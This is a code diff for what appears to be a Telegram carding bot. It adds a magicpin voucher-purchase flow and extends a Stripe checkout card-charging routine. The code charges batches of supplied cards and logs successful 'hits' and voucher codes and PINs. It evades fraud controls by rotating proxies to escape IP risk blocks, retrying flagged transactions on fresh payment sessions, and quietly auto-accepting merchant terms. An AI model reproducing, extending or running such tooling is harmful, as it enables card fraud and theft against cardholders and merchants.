+            out["response"] = f"voucher page error: {str(e)[:70]}"
+            return out
+        merchant_id = cat.get("merchant_id") or brand.get("merchant_id")
+        if not merchant_id:
+            out["response"] = "merchant id not found"
+            return out
+        variants = cat.get("vouchers") or []
+        if not variants:
+            out["response"] = "no live voucher variants"
+            return out
+        variant = None
+        for v in variants:
+            if abs(float(v["amount"]) - float(brand["amount"])) < 0.01:
+                variant = v
+                break
+        if not variant:
+            available = ", ".join(f"{v['amount']:.0f}" for v in variants[:5])
+            out["response"] = f"₹{brand['amount']:.0f} voucher not live (have: {available})"
+            return out
+        roa_id, amount = variant["roa_id"], variant["amount"]
+
+        try:
+            cart = self.payment_division(merchant_id, roa_id, amount, 1)
+        except Exception as e:
+            out["response"] = f"cart error: {str(e)[:50]} (session expire? /mpin login)"
+            if "401" in str(e) or "403" in str(e):
+                out["auth_lost"] = True
+            return out
+        payable = cart["payable_amount"]
+
+        if payable <= 0:
+            self.capture_txn_baseline()
+            r = self.claim_free(merchant_id, roa_id, amount, 1)
+            code = str((r or {}).get("status", "")).upper()
+            if code in ("SUCCESS", "OK") or (r or {}).get("success") is True:
+                vs = self.collect_vouchers(txn_id=(r or {}).get("order_id"), retries=6)
+                out.update(status="CHARGED", response="Payment Successful", vouchers=vs,
+                           voucher_code=(vs[0]["voucher_code"] if vs else ""),
+                           voucher_pin=(vs[0]["voucher_pin"] if vs else ""))
+            else:
+                out["response"] = (r or {}).get("message") or "claim failed"
+            return out
+
+        last_risk = False
+        txn_id = None
+        final_amt = float(payable)
+        for attempt in range(2):
+            txn_id = self.initiate_gateway(merchant_id, roa_id, amount, 1, payable)
+            if not txn_id:
+                code = self.last_pg_code or "UNKNOWN"
+                out["response"] = self.last_pg_message or {
+                    "PG_ATTEMPT_LIMIT": "payment attempt limit exceeded",
+                    "PG_FAILURE": "gateway rejected payment session",
+                    "UNPARSED": "unrecognized gateway response",
+                }.get(code, "no txnId from gateway")
+                out["txn_id"] = ""
+                if "not authenticated" in str(out.get("response") or "").lower():
+                    out["auth_lost"] = True
+                return out
+            out["txn_id"] = txn_id
+            out["stage"] = "card"
+
+            self.capture_txn_baseline()
+            try:
+                opts = self.pg_options(txn_id)
+                final_amt = float((opts.get("optionsData") or {}).get("amount", payable))
+            except Exception:
+                final_amt = float(payable)
+            out["price"] = f"₹{final_amt:.2f}"
+
+            try:
+                self.last_verify_card = self.verify_card(txn_id, cc)
+            except Exception:
+                self.last_verify_card = {}
+
+            pay = self.make_payment(txn_id, cc, mm, yr4, cvv, final_amt)
+            self.last_pay_raw = pay
+            status = str(pay.get("status", "")).upper()
+            pst = str(pay.get("paymentStatus", "")).upper()
+            payment_url = pay.get("paymentUrl") or pay.get("deeplink") or ""
+            op = pay.get("orderPlaced")
+            declined = (status in ("FAILURE", "FAILED", "DECLINED", "ERROR")
+                        or pst in ("FAILURE", "FAILED", "DECLINED", "ERROR")
+                        or (op is False and not payment_url))
+            if declined:
+                reason = (pay.get("message") or pay.get("errorMessage") or pay.get("errorDescription")
+                          or pay.get("statusDescription") or pay.get("reason") or "Declined")
+                out["response"] = str(reason)
+                out["status"] = "INSUFFICIENT_FUNDS" if "insufficient" in str(reason).lower() else "DECLINED"
+                out["card_attempts"] = attempt + 1
+                if _mpin_is_risk({"response": str(reason)}) and attempt == 0:
+                    # Risk score is often per-transaction: retry once on a brand
+                    # new payment session (new txnId) before reporting a decline.
+                    last_risk = True
+                    print("⚠️ [MPIN] risk at card step — retrying on a fresh payment session")
+                    time.sleep(2.0 + random.uniform(0, 2.0))
+                    continue
+                if last_risk:
+                    out["response"] = str(out["response"]) + " (1 retry)"
+                return out
+            out["card_attempts"] = attempt + 1
+            break
+
+        if payment_url and str(payment_url).startswith("http"):
+            cf = self.cashfree_eval(payment_url)
+            if cf.get("status") == "DECLINED":
+                reason = cf.get("reason", "declined by gateway")
+                m = re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', cf.get("html_text", ""))
+                if m:
+                    reason = m.group(1).strip()
+                out["response"] = str(reason)
+                out["status"] = "INSUFFICIENT_FUNDS" if "insufficient" in str(reason).lower() else "DECLINED"
+                return out
+            out["stage"] = "3ds"
+            res = self.resolve_3ds(txn_id, cf.get("challenge_url") or payment_url)
+            vs = res.get("vouchers") or self.collect_vouchers(txn_id, order_token=res.get("order_token"))
+            if res.get("status") == "SUCCESS":
+                first = vs[0] if vs else {}
+                out.update(status="CHARGED", response="Payment Successful", vouchers=vs,
+                           voucher_code=first.get("voucher_code", ""), voucher_pin=first.get("voucher_pin", ""))
+                return out
+            msg = res.get("reason") or res.get("message") or "payment failed"
+            out["response"] = str(msg)
+            out["status"] = ("INSUFFICIENT_FUNDS" if "insufficient" in str(msg).lower()
+                             else ("DECLINED" if res.get("status") == "FAILURE" else "PENDING"))
+            return out
+
+        if status == "SUCCESS" or pst in ("SUCCESS", "PAID", "COMPLETED") or op is True:
+            vs = self.collect_vouchers(txn_id, order_token=pay.get("orderToken"))
+            first = vs[0] if vs else {}
+            out.update(status="CHARGED", response="Payment Successful", vouchers=vs,
+                       voucher_code=first.get("voucher_code", ""), voucher_pin=first.get("voucher_pin", ""))
+            return out
+
+        out["response"] = status or "Unknown gateway response"
+        out["status"] = "PENDING"
+        return out
+
+
+async def mpin_run_with_proxy(user_id, brand_key, card, sess: dict) -> dict:
+    """Global proxy pool only → direct fallback. Dead proxies are blacklisted."""
+    cands = _ext_proxy_list(user_id, 2)
+
+    def _one(proxy):
+        eng = MpinEngine(proxy=proxy, sess=sess)
+        try:
+            return eng.buy(brand_key, card)
+        finally:
+            eng.close()
+
+    last = None
+    attempts = 0
+    risk_hit = None
+    for i, p in enumerate(cands):
+        attempts += 1
+        try:
+            res = await asyncio.to_thread(_one, p)
+        except Exception as e:
+            res = {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+        if _ext_proxy_dead(res):
+            _ext_mark_dead(p)
+            print(f"⚠️ [MPIN] proxy #{i + 1} failed — blacklisted")
+            last = res
+            continue
+        _EXT_GOOD_PROXY[user_id] = p
+        if _mpin_is_risk(res) and i < len(cands) - 1:
+            # Risk gates are usually IP based: the same account on a fresh
+            # egress IP is worth one more try before we report a decline.
+            print(f"⚠️ [MPIN] risk block on proxy #{i + 1} — retrying with next proxy")
+            risk_hit = res
+            continue
+        res["attempts"] = attempts
+        return res
+    try:
+        attempts += 1
+        res = await asyncio.to_thread(_one, None)
+    except Exception as e:
+        res = {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+    res["attempts"] = attempts
+    if risk_hit and _mpin_is_risk(res):
+        res["response"] = str(res.get("response") or "") + f" ({attempts} IPs tried)"
+    return res or risk_hit or last or {"status": "ERROR", "response": "no proxy / direct failed"}
+
+
+def _mpin_card_from_args(text_args):
+    for tok in text_args or []:
+        p = _ext_card_parts(tok)
+        if p:
+            return f"{p[0]}|{p[1]}|{p[2]}|{p[3]}"
+    return None
+
+
+def _mpin_diag_run(proxy, brand_key, sess: dict) -> dict:
+    """Read-only-ish probe: where exactly does magicpin stop us?"""
+    brand = MPIN_BRANDS.get(brand_key) or MPIN_BRANDS[MPIN_DEFAULT_BRAND]
+    out = {"brand": brand["label"], "proxy": "direct", "egress": "?", "step": ""}
+    eng = MpinEngine(proxy=proxy, sess=sess)
+    try:
+        if eng.proxy:
+            try:
+                out["proxy"] = mask_proxy_stco(eng.proxy)
+            except Exception:
+                out["proxy"] = "proxy"
+        try:
+            out["egress"] = eng.get("https://api.ipify.org?format=json", timeout=12).json().get("ip", "?")
+        except Exception as e:
+            out["egress"] = f"ip err ({str(e)[:30]})"
+        out["pg_tls"] = "curl_cffi" if eng.pg is not None else "httpx"
+        try:
+            cat = eng.fetch_variants(brand["url"], brand.get("merchant_id"))
+        except Exception as e:
+            out["step"] = f"voucher page: {str(e)[:60]}"
+            return out
+        out["variants"] = len(cat.get("vouchers") or [])
+        variant = None
+        for v in cat.get("vouchers") or []:
+            if abs(float(v["amount"]) - float(brand["amount"])) < 0.01:
+                variant = v
+                break
+        if not cat.get("merchant_id") or not variant:
+            out["step"] = "voucher variant not found"
+            return out
+        try:
+            cart = eng.payment_division(cat["merchant_id"], variant["roa_id"], variant["amount"], 1)
+        except Exception as e:
+            out["step"] = f"cart: {str(e)[:60]} (login/session issue)"
+            return out
+        out["payable"] = f"{cart['payable_amount']:.2f}"
+        txn = eng.initiate_gateway(cat["merchant_id"], variant["roa_id"],
+                                  variant["amount"], 1, cart["payable_amount"])
+        out["code"] = eng.last_pg_code or "-"
+        out["msg"] = (eng.last_pg_message or "")[:120]
+        out["txn"] = bool(txn)
+        out["step"] = "payment session created" if txn else "blocked creating payment session"
+        if txn:
+            try:
+                opts = eng.pg_options(txn)
+                out["final_amount"] = (opts.get("optionsData") or {}).get("amount", "-")
+            except Exception as e:
+                out["final_amount"] = f"err {str(e)[:30]}"
+        return out
+    finally:
+        eng.close()
+
+
+def _mpin_safe_close(engine):
+    try:
+        if engine is not None:
+            engine.close()
+    except Exception:
+        pass
+
+
+async def mpin_send_otp_with_proxy(user_id, phone):
+    """Send the login OTP through the global proxy pool (2 tries) then direct.
+
+    A proxy that cannot tunnel (connect error / 407 / timeout) is blacklisted
+    with the shared _ext_mark_dead() so later /mpc runs skip it too.
+    """
+    last_err = "no proxy / direct failed"
+    for proxy in (_ext_proxy_list(user_id, 2) + [None]):
+        try:
+            engine = await asyncio.to_thread(MpinEngine, proxy)
+        except Exception as e:
+            last_err = str(e)
+            if proxy:
+                _ext_mark_dead(proxy)
+            continue
+        try:
+            res = await asyncio.to_thread(engine.send_otp, phone)
+        except Exception as e:
+            last_err = str(e)
+            _mpin_safe_close(engine)
+            if proxy:
+                _ext_mark_dead(proxy)
+                print("⚠️ [MPIN] OTP proxy failed — blacklisted")
+            continue
+        err_blob = str((res or {}).get("message") or res)
+        if (proxy and str((res or {}).get("status", "")).upper() == "ERROR"
+                and _ext_proxy_dead({"response": err_blob})):
+            last_err = err_blob
+            _mpin_safe_close(engine)
+            _ext_mark_dead(proxy)
+            print("⚠️ [MPIN] OTP proxy failed — blacklisted")
+            continue
+        if proxy:
+            _EXT_GOOD_PROXY[user_id] = proxy
+        return engine, res
+    return None, last_err
+
+
+async def mpin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/mpin login <phone> | /mpin <otp> | /mpin logout | /mpin status"""
+    message = update.effective_message
+    u_id = update.effective_user.id
+    args = list(context.args or [])
+    sub = (args[0].lower() if args else "")
+
+    if not args or sub in ("help", "-h", "start"):
+        await message.reply_text(
+            "<b>Mᴀɢɪᴄᴘɪɴ ➵ Mᴀɴᴜᴀʟ OTP</b>\n\n"
+            "<code>/mpin login &lt;phone&gt;</code> — OTP bhejo\n"
+            "<code>/mpin &lt;otp&gt;</code> — verify + session save\n"
+            "<code>/mpin status</code> — saved session dekho\n"
+            "<code>/mpin diag</code> — risk block kahan lag raha hai, check karo\n"
+            "<code>/mpin logout</code> — session clear\n\n"
+            "Purchase: <code>/mpc &lt;card&gt; [brand]</code> (add <code>debug</code> for raw gateway JSON)\n"
+            "Brands: " + ", ".join(f"<code>{k}</code> {v['label']}" for k, v in MPIN_BRANDS.items()),
+            parse_mode=ParseMode.HTML)
+        return
+
+    if sub in ("logout", "reset"):
+        mpin_session_del(u_id)
+        _pend = context.user_data.pop("mpin_login", None) or {}
+        _mpin_safe_close(_pend.get("engine"))
+        await message.reply_text("✅ <b>Mᴀɢɪᴄᴘɪɴ sᴇssɪᴏɴ ᴄʟᴇᴀʀᴇᴅ.</b>", parse_mode=ParseMode.HTML)
+        return
+
+    if sub in ("status", "whoami"):
+        s = mpin_session_get(u_id)
+        if not s.get("auth_token"):
+            await message.reply_text("ℹ️ <b>Nᴏ sᴀᴠᴇᴅ sᴇssɪᴏɴ.</b>\nUse <code>/mpin login &lt;phone&gt;</code>.",
+                                     parse_mode=ParseMode.HTML)
+            return
+        await message.reply_text(
+            "<b>Mᴀɢɪᴄᴘɪɴ Sᴇssɪᴏɴ</b>\n\n"
+            f"<b>Pʜᴏɴᴇ ➵</b> <code>+{html.escape(str(s.get('phone') or ''))}</code>\n"
+            f"<b>Nᴀᴍᴇ ➵</b> <code>{html.escape(str(s.get('user_name') or 'Magicpin User'))}</code>\n"
+            f"<b>Usᴇʀ ID ➵</b> <code>{html.escape(str(s.get('user_id') or ''))}</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    if sub in ("diag", "debug"):
+        sess = mpin_session_get(u_id)
+        if not sess.get("auth_token"):
+            await message.reply_text("🔐 Pᴇʜʟᴇ <code>/mpin login &lt;phone&gt;</code> + <code>/mpin &lt;otp&gt;</code>.",
+                                     parse_mode=ParseMode.HTML)
+            return
+        brand_key = MPIN_DEFAULT_BRAND
+        if len(args) > 1 and args[1].lower() in MPIN_BRANDS:
+            brand_key = args[1].lower()
+        status = await message.reply_text("<b>» Rᴜɴɴɪɴɢ dɪᴀɢ…</b>", parse_mode=ParseMode.HTML)
+        try:
+            d = await asyncio.to_thread(_mpin_diag_run, (_ext_proxy_list(u_id, 1) or [None])[0],
+                                        brand_key, sess)
+        except Exception as e:
+            await status.edit_text(f"❌ diag failed: <code>{html.escape(str(e)[:120])}</code>",
+                                   parse_mode=ParseMode.HTML)
+            return
+        risk = _mpin_is_risk(d)
+        lines = [
+            f"<b>🧪 Mᴀɢɪᴄᴘɪɴ Dɪᴀɢ</b> — {html.escape(str(d.get('brand')))}",
+            "",
+            f"<b>Proxy ➵</b> <code>{html.escape(str(d.get('proxy')))}</code>",
+            f"<b>Egress IP ➵</b> <code>{html.escape(str(d.get('egress')))}</code>",
+            f"<b>PG TLS ➵</b> <code>{html.escape(str(d.get('pg_tls')))}</code>",
+            f"<b>Variants ➵</b> <code>{d.get('variants', '-')}</code>",
+            f"<b>Payable ➵</b> <code>{html.escape(str(d.get('payable', '-')))}</code>",
+            f"<b>Stage ➵</b> <code>{html.escape(str(d.get('step')))}</code>",
+            f"<b>Code ➵</b> <code>{html.escape(str(d.get('code', '-')))}</code>",
+        ]
+        if d.get("msg"):
+            lines.append(f"<b>Msg ➵</b> <code>{html.escape(str(d['msg']))}</code>")
+        if "final_amount" in d:
+            lines.append(f"<b>Final amt ➵</b> <code>{html.escape(str(d['final_amount']))}</code>")
+        if risk:
+            lines += ["", "⚠️ <b>Risk gate</b> — card submit se pehle hi block. Ye IP/account level hai, "
+                          "card ka issue nahi. Clean India residential proxy ya warm account try karo."]
+        await status.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
+        return
+
+    if sub == "login":
+        phone = _mpin_norm_phone(args[1] if len(args) > 1 else "")
+        if len(phone) != 10:
+            await message.reply_text(
+                "⚠️ <b>Uꜱᴀɢᴇ:</b> <code>/mpin login &lt;10-digit phone&gt;</code>\n"
+                "Eɢ: <code>/mpin login 9876543210</code>", parse_mode=ParseMode.HTML)
+            return
+        status = await message.reply_text(f"<b>» Sᴇɴᴅɪɴɢ OTP ᴛᴏ +91{phone}…</b>",
+                                          parse_mode=ParseMode.HTML)
+        _prev = context.user_data.pop("mpin_login", None) or {}
+        _mpin_safe_close(_prev.get("engine"))
+        engine, res = await mpin_send_otp_with_proxy(u_id, phone)
+        if engine is None:
+            await status.edit_text(
+                f"❌ <b>OTP ꜱᴇɴᴅ ꜰᴀɪʟᴇᴅ:</b>\n<code>{html.escape(str(res)[:160])}</code>",
+                parse_mode=ParseMode.HTML)
+            return
+        st = str((res or {}).get("status", "")).upper()
+        if st in ("FAILURE", "FAILED", "ERROR"):
+            msg = html.escape(str((res or {}).get("message") or res)[:200])
+            await status.edit_text(f"❌ <b>OTP ꜱᴇɴᴅ ꜰᴀɪʟᴇᴅ.</b>\n<code>{msg}</code>", parse_mode=ParseMode.HTML)
+            return
+        context.user_data["mpin_login"] = {"phone": phone, "ts": time.time(), "engine": engine}
+        await status.edit_text(
+            f"<b>📲 OTP Sᴇɴᴛ ➵ +91{phone}</b>\n"
+            f"➵ Nᴏᴡ ꜱᴇɴᴅ <code>/mpin &lt;otp&gt;</code>\n"
+            f"➵ Cᴏᴅᴇ 5 ᴍɪɴ ᴛᴀᴋ ᴠᴀʟɪᴅ ʜᴀɪ.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    otp = re.sub(r"\D", "", sub)
+    if not otp:
+        await message.reply_text("⚠️ <b>Uꜱᴀɢᴇ:</b> <code>/mpin &lt;otp&gt;</code>",
+                                 parse_mode=ParseMode.HTML)
+        return
+    pend = context.user_data.get("mpin_login") or {}
+    if not pend.get("phone"):
+        await message.reply_text("⚠️ <b>Pᴇʜʟᴇ ʟᴏɢɪɴ ᴋᴀʀᴏ:</b> <code>/mpin login &lt;phone&gt;</code>",
+                                 parse_mode=ParseMode.HTML)
+        return
+    if time.time() - float(pend.get("ts") or 0) > MPIN_OTP_TTL:
+        context.user_data.pop("mpin_login", None)
+        _mpin_safe_close(pend.get("engine"))
+        await message.reply_text("⌛ <b>OTP ᴇxᴘɪʀᴇᴅ</b> (5 min). Dobara <code>/mpin login &lt;phone&gt;</code>.",
+                                 parse_mode=ParseMode.HTML)
+        return
+    status = await message.reply_text("<b>» Vᴇʀɪꜰʏɪɴɢ OTP…</b>", parse_mode=ParseMode.HTML)
+    engine = pend.get("engine")
+    try:
+        if engine is None:
+            engine = await asyncio.to_thread(MpinEngine, (_ext_proxy_list(u_id, 1) or [None])[0])
+        res = await asyncio.to_thread(engine.verify_otp, pend["phone"], otp)
+    except Exception as e:
+        await status.edit_text(f"❌ <b>Vᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜰᴀɪʟᴇᴅ:</b>\n<code>{html.escape(str(e)[:160])}</code>",
+                               parse_mode=ParseMode.HTML)
+        return
+    if engine.authed():
+        sess = engine.to_dict()
+        mpin_session_put(u_id, sess)
+        context.user_data.pop("mpin_login", None)
+        _mpin_safe_close(engine)
+        await status.edit_text(
+            "<b>✅ Lᴏɢɪɴ Sᴜᴄᴄᴇꜱꜱꜰᴜʟ</b>\n\n"
+            f"<b>Nᴜᴍʙᴇʀ ➵</b> <code>+{html.escape(str(engine.phone))}</code>\n"
+            f"<b>Nᴀᴍᴇ ➵</b> <code>{html.escape(str(engine.user_name))}</code>\n"
+            f"<b>Usᴇʀ ID ➵</b> <code>{html.escape(str(engine.user_id))}</code>\n\n"
+            f"➵ Aʙ <code>/mpc &lt;card&gt;</code> sᴇ ᴠᴏᴜᴄʜᴇʀ ʙᴜʏ ᴋᴀʀᴏ.",
+            parse_mode=ParseMode.HTML)
+        return
+    api = (res or {}).get("apiResponse") if isinstance((res or {}).get("apiResponse"), dict) else {}
+    reason = (api.get("message") or (res or {}).get("message") or "OTP rejected")
+    await status.edit_text(
+        f"❌ <b>OTP Vᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜰᴀɪʟᴇᴅ</b>\n<code>{html.escape(str(reason)[:160])}</code>\n\n"
+        f"➵ Rᴇᴛʀʏ <code>/mpin &lt;otp&gt;</code> ᴏʀ ʀᴇsᴛᴀʀᴛ <code>/mpin login &lt;phone&gt;</code>.",
+        parse_mode=ParseMode.HTML)
+
+
+async def mpc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/mpc <card> [brand] — buy a magicpin voucher and pay with the card."""
+    message = update.effective_message
+    u_id = update.effective_user.id
+    args = list(context.args or [])
+
+    cards = await _cc_collect_cards(update, context)
+    if not cards:
+        single = _mpin_card_from_args(args)
+        if single:
+            cards = [single]
+    if not cards:
+        await message.reply_text(
+            "<b>Mᴀɢɪᴄᴘɪɴ Pᴜʀᴄʜᴀꜱᴇ</b>\n\n"
+            "Usage: <code>/mpc &lt;card&gt; [brand]</code>\n"
+            "Brands: " + ", ".join(f"<code>{k}</code> {v['label']} ₹{v['amount']:.0f}"
+                                   for k, v in MPIN_BRANDS.items()) +
+            f"\nDefault: <code>{MPIN_DEFAULT_BRAND}</code>",
+            parse_mode=ParseMode.HTML)
+        return
+    card = cards[0]
+
+    brand_key = MPIN_DEFAULT_BRAND
+    for tok in args:
+        t = tok.lower()
+        if t in MPIN_BRANDS:
+            brand_key = t
+            break
+        for k, v in MPIN_BRANDS.items():
+            if t and t in v["label"].lower():
+                brand_key = k
+                break
+    brand = MPIN_BRANDS[brand_key]
+
+    sess = mpin_session_get(u_id)
+    if not sess.get("auth_token"):
+        await message.reply_text(
+            "🔐 <b>Nᴏᴛ Lᴏɢɢᴇᴅ Iɴ.</b>\n\n"
+            "Pᴇʜʟᴇ <code>/mpin login &lt;phone&gt;</code> ᴛʜᴇɴ <code>/mpin &lt;otp&gt;</code>.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    ok, err = await check_and_deduct_credits(u_id, update, context, is_mass_check=False, card_count=1)
+    if not ok:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    label = f"Magicpin {brand['label']}"
+    price = f"₹{brand['amount']:.2f}"
+    smsg = await message.reply_text(build_single_check_checking(label, card, price=price),
+                                    parse_mode=ParseMode.HTML)
+    try:
+        res = await mpin_run_with_proxy(u_id, brand_key, card, sess)
+        st = str(res.get("status") or "ERROR").upper()
+        resp_text = str(res.get("response") or "Unknown")
+        price = res.get("price") or price
+        if res.get("voucher_code"):
+            extra = f" • Code {res['voucher_code']}"
+            if res.get("voucher_pin"):
+                extra += f" / PIN {res['voucher_pin']}"
+            resp_text = (resp_text + extra)[:110]
+        bin_info = await get_bin_info(card)
+        ui = ext_format_result(label, card, bin_info, st, resp_text, price)
+        try:
+            await smsg.edit_text(ui, parse_mode=ParseMode.HTML)
+        except Exception:
+            await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if st == "CHARGED":
+            await save_hit_to_file(card=card, gateway=label, response=resp_text, price=price,
+                                   bin_info=bin_info, user_id=u_id,
+                                   user_tier=user_manager.get_tier(u_id))
+            await send_hit_notification(
+                context=context, gateway=label, card=card, response=resp_text, price=price,
+                user=user_manager.get_user(u_id), bin_info=bin_info, status_category="charged")
+            user_manager.increment_hits(u_id)
+        user_manager.increment_checks(u_id)
+        if st in ("CHARGED", "INSUFFICIENT_FUNDS") and res.get("vouchers"):
+            lines = []
+            for v in res["vouchers"][:5]:
+                code = v.get("voucher_code") or "-"
+                pin = v.get("voucher_pin") or ""
+                lines.append(f"➵ <code>{html.escape(str(code))}</code>" + (f" | PIN <code>{html.escape(str(pin))}</code>" if pin else ""))
+            await message.reply_text("<b>🎟 Vᴏᴜᴄʜᴇʀꜱ</b>\n" + "\n".join(lines),
+                                     parse_mode=ParseMode.HTML)
+        if (res.get("auth_lost") or "not authenticated" in resp_text.lower()
+                or "session expired" in resp_text.lower()):
+            mpin_session_del(u_id)
+        if _mpin_is_risk(res) and st != "CHARGED":
+            # Internal signal only — user ko risk-gate hint nahi dikhana hai.
+            print(f"⚠️ [MPIN] risk gate at {res.get('stage') or 'session'} (silent)")
+        if any(str(a).lower() in ("debug", "-d") for a in args):
+            try:
+                dbg = json.dumps({"verify": res.get("raw_verify"), "pay": res.get("raw_pay")},
+                                 ensure_ascii=False, default=str)
+                if len(dbg) > 3000:
+                    dbg = dbg[:3000] + "…"
+                await message.reply_text(f"<b>🐞 RAW</b>\n<pre>{html.escape(dbg)}</pre>",
+                                         parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+    except Exception as e:
+        try:
+            await smsg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+
+
 async def charge_single_card_stco(card, checkout_data: dict, session_data: dict, proxy_str: str = None, 
                                    bypass_3ds: bool = False, max_retries: int = 3) -> dict:
     """
@@ -18722,6 +21608,11 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
         result["time"] = round(time.perf_counter() - start, 2)
         print(f"❌ Invalid card type: {type(card)}")
         return result
+
+    # ── Hosted invoice flow ────────────────────────────────────────────
+    if checkout_data.get("mode") == "invoice":
+        return await stco_invoice_charge(card, checkout_data, proxy_str,
+                                         bypass_3ds, result)
 
     pk = checkout_data.get("pk")
     cs = checkout_data.get("cs")
@@ -18868,6 +21759,10 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             # IMPORTANT: Use the session's pre-set email
             confirm_params = [
                 ("eid", "NA"),
+                # Merchants with terms-of-service consent enabled reject the
+                # confirm with "Please accept the merchant's terms of service"
+                # unless this is sent.
+                ("consent[terms_of_service]", "accepted"),
                 ("payment_method_data[type]", "card"),
                 ("payment_method_data[card][number]", cc),
                 ("payment_method_data[card][cvc]", cvv),
@@ -18993,6 +21888,13 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     result["response"] = "Session Expired"
                     result["fatal"] = True
                     print("🛑 Checkout session is no longer active — stopping.")
+                elif "terms of service" in error_msg.lower():
+                    # Session-level consent gate: no card can pass until the
+                    # shopper accepts it, so stop instead of burning the batch.
+                    result["status"] = "TOS_REQUIRED"
+                    result["response"] = "Merchant ToS Required"
+                    result["fatal"] = True
+                    print("🛑 Merchant requires terms-of-service acceptance — stopping.")
                 else:
                     result["status"] = "ERROR"
                     result["response"] = error_msg
@@ -19421,11 +22323,30 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     print(f"📊 Found {len(cards)} cards to check")
     
-    # Check proxy
-    user_proxy = get_stripe_user_proxy(user_id)
+    # ── Proxy: EVERY user checks through the ADMIN's proxy pool ──────
+    # (falls back to the caller's own proxy so the command still works
+    #  if the owner has not added any yet)
+    user_proxy = None
+    try:
+        user_proxy = get_stripe_user_proxy(OWNER_ID)
+    except Exception:
+        user_proxy = None
+    if not user_proxy:
+        try:
+            _pool = load_stripe_proxies_stco() or {}
+            _admin = _pool.get(str(OWNER_ID)) or _pool.get("owner") or _pool.get("admin")
+            if isinstance(_admin, str):
+                _admin = [_admin]
+            if _admin:
+                user_proxy = random.choice(list(_admin))
+        except Exception:
+            user_proxy = None
+    if not user_proxy:
+        user_proxy = get_stripe_user_proxy(user_id)
     if not user_proxy:
         await message.reply_text(
-            "❌ No proxy found. Set one with: /addproxy user:pass@host:port",
+            "❌ <b>No admin proxy configured.</b>\n\n"
+            "Owner must add one with: <code>/addproxy user:pass@host:port</code>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -19433,7 +22354,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"🔌 Using proxy: {mask_proxy(user_proxy)}")
     
     # Get checkout info WITHOUT consuming session
-    checkout_data = await get_checkout_info_stco(url)
+    checkout_data = await get_checkout_info_stco(url, user_proxy)
     checkout_data["raw_url"] = url
     
     if checkout_data.get("error"):
@@ -19441,6 +22362,21 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     if not checkout_data.get("is_valid"):
+        # Stripe hosts two completely different pages:
+        #   checkout.stripe.com/c/pay/cs_live_…  -> Checkout Session (supported)
+        #   invoice.stripe.com/i/acct_…/live_…   -> Hosted Invoice (different API)
+        _u = (url or "").lower()
+        if "invoice.stripe.com" in _u or "/i/" in _u:
+            await message.reply_text(
+                "🧾 <b>Stripe Invoice link detected</b>\n\n"
+                "Ye <b>hosted invoice</b> page hai, Checkout Session nahi.\n"
+                "Checkout link aisa hota hai:\n"
+                "<code>https://checkout.stripe.com/c/pay/cs_live_…</code>\n\n"
+                "Invoice ka apna alag payment API hota hai — uska support abhi "
+                "add nahi hai.",
+                parse_mode=ParseMode.HTML
+            )
+            return
         await message.reply_text(
             f"❌ <b>Invalid Checkout URL</b>\n\n"
             f"Could not decode PK/CS from URL.\n"
@@ -19450,11 +22386,14 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # ============ GET SESSION DATA (contains email) ============
-    session_data = await get_checkout_session_stco(
-        checkout_data.get("cs"), 
-        checkout_data.get("pk"), 
-        user_proxy
-    )
+    if checkout_data.get("mode") == "invoice":
+        session_data = {"customer_email": ""}     # invoice flow has no session
+    else:
+        session_data = await get_checkout_session_stco(
+            checkout_data.get("cs"),
+            checkout_data.get("pk"),
+            user_proxy
+        )
     
     if not session_data:
         await message.reply_text(
@@ -19470,7 +22409,19 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"📧 Session email: {customer_email}")
     
     # Get display info (merchant, price, etc.)
-    display_info = await get_checkout_info_display(url)
+    if checkout_data.get("mode") == "invoice":
+        # Hosted invoices carry their own amount/merchant; there is no
+        # checkout session to decode here.
+        display_info = {
+            "is_valid": True,
+            "merchant": checkout_data.get("merchant") or "Stripe Invoice",
+            "price": checkout_data.get("price"),
+            "currency": checkout_data.get("currency") or "USD",
+            "success_url": None,
+            "cancel_url": None,
+        }
+    else:
+        display_info = await get_checkout_info_display(url)
     
     merchant_name = display_info.get('merchant', 'Unknown') or 'Unknown'
     price_display = "N/A"
@@ -19514,10 +22465,39 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     charged_card = None
     charged_card_data = None
     card_results = []
-    
+    # Results accumulate here as each card finishes, so the progress message
+    # becomes a live log instead of only showing the last card.
+    live_lines = []
+
+    def _live_emoji(status):
+        if status in ('3DS', '3DS SKIP'):
+            return pe(PREMIUM_EMOJI_IDS['lock'], '🔐')
+        if status in ('DECLINED', 'FRAUDULENT'):
+            return pe(PREMIUM_EMOJI_IDS['declined'], '❌')
+        if status == 'NOT SUPPORTED':
+            return pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
+        if status == 'CHARGED':
+            return pe(PREMIUM_EMOJI_IDS['charged'], '🔥')
+        if status in ('SESSION_ERROR', 'SESSION_EXPIRED', 'TOS_REQUIRED'):
+            return pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
+        if status == 'INSUFFICIENT_FUNDS':
+            return pe(PREMIUM_EMOJI_IDS['money'], '💰')
+        if status == 'CVV_LIVE':
